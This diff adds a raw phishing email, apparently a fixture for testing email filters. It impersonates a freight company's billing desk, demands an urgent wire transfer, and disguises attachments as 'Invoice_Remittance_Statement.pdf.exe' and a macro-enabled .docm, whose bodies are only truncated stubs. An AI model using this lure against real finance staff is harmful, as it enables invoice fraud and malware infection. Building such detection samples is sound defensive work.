@@ -1,0 +1,40 @@
+From: "Billing Operations" <invoicing@logistics-freight.top>
+Reply-To: "Remittance Desk" <payment-portal@invoices-collect.xyz>
+To: "Accounts Payable" <ap@target-company.com>
+Subject: Past Due Invoice Notice: Statement INV-89240 (Urgent Wire Transfer Required)
+Date: Mon, 16 Nov 2026 05:00:00 +0000
+MIME-Version: 1.0
+Message-ID: <invoice-threat-attachment-9901@logistics-freight.top>
+Authentication-Results: mx.target-company.com; spf=softfail; dkim=none; dmarc=none
+Content-Type: multipart/mixed; boundary="----=_EPA_Part_9823_Boundary"
+
+------=_EPA_Part_9823_Boundary
+Content-Type: text/plain; charset=utf-8
+
+Dear Accounting Team,
+
+Please review the attached past due remittance statement for billings through October 2026.
+Immediate wire transfer settlement is requested within 48 hours to avoid credit service disruption.
+
+Attached:
+1. Invoice_Remittance_Statement.pdf.exe
+2. Tax_Exemption_Form.docm
+
+Accounts Receivable Division
+Logistics Freight International
+
+------=_EPA_Part_9823_Boundary
+Content-Type: application/octet-stream; name="Invoice_Remittance_Statement.pdf.exe"
+Content-Disposition: attachment; filename="Invoice_Remittance_Statement.pdf.exe"
+Content-Transfer-Encoding: base64
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
+ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAAAAAAAA
+------=_EPA_Part_9823_Boundary
+Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Tax_Exemption_Form.docm"
+Content-Disposition: attachment; filename="Tax_Exemption_Form.docm"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAAAIAAAAAAAAAAAAAAAAAAAAAAAIAAAAd29yZC92YmFQcm9qZWN0LmJpbgAAAAD//w==
+------=_EPA_Part_9823_Boundary--
